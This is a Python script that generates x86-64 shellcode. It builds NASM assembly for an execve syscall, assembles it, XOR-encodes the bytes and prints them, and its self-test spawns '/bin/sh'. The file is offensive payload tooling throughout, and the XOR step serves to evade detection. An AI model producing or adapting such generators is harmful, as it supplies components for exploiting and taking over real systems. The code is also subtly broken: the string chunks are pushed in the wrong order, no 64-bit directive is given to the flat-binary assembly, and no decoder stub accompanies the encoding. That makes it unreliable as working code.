#!/usr/bin/env python3
import os
import tempfile
import subprocess
import struct

def generate_asm_code(command, xor_key=0x01):
    """Generate NASM assembly code for the given command."""
    # Convert command to null-terminated string
    cmd_bytes = command.encode() + b'\x00'
    
    # Generate assembly code
    asm_code = """section .text
global _start

_start:
    ; Save registers
    push rbp
    mov rbp, rsp
    sub rsp, 0x1000    ; Allocate stack space
    
    ; Clear registers
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    
    ; Push command string onto stack
"""
    
    # Add command string in chunks
    for i in range(0, len(cmd_bytes), 8):
        chunk = cmd_bytes[i:i+8]
        while len(chunk) < 8:
            chunk += b'\x00'
        value = struct.unpack('<Q', chunk)[0]
        asm_code += f"    mov rax, 0x{value:016x}\n"
        asm_code += "    push rax\n"
    
    asm_code += """
    ; Setup execve arguments
    mov rdi, rsp        ; Command string
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    
    ; Call execve
    mov rax, 59         ; syscall number for execve
    syscall
    
    ; Exit if execve fails
    mov rax, 60         ; syscall number for exit
    xor rdi, rdi        ; exit code 0
    syscall
"""
    return asm_code

def compile_asm_to_shellcode(command, xor_key=0x01):
    """Compile NASM assembly to shellcode and apply XOR encoding."""
    # Create temporary directory
    with tempfile.TemporaryDirectory() as temp_dir:
        # Generate assembly code
        asm_code = generate_asm_code(command, xor_key)
        
        # Write assembly code to temporary file
        asm_file = os.path.join(temp_dir, "shellcode.asm")
        with open(asm_file, 'w') as f:
            f.write(asm_code)
        
        # Compile with NASM
        obj_file = os.path.join(temp_dir, "shellcode.o")
        try:
            subprocess.run(['nasm', '-f', 'bin', '-o', obj_file, asm_file], check=True)
        except subprocess.CalledProcessError as e:
            raise Exception(f"NASM compilation failed: {str(e)}")
        except FileNotFoundError:
            raise Exception("NASM is not installed. Please install NASM to use this tool.")
        
        # Read the compiled binary
        with open(obj_file, 'rb') as f:
            shellcode = bytearray(f.read())
        
        # Apply XOR encoding
        for i in range(len(shellcode)):
            shellcode[i] ^= xor_key
        
        return shellcode

if __name__ == "__main__":
    # Test the compiler
    test_command = "/bin/sh"
    shellcode = compile_asm_to_shellcode(test_command)
    print(f"Generated shellcode ({len(shellcode)} bytes):")
    print(''.join(f'\\x{b:02x}' for b in shellcode)) 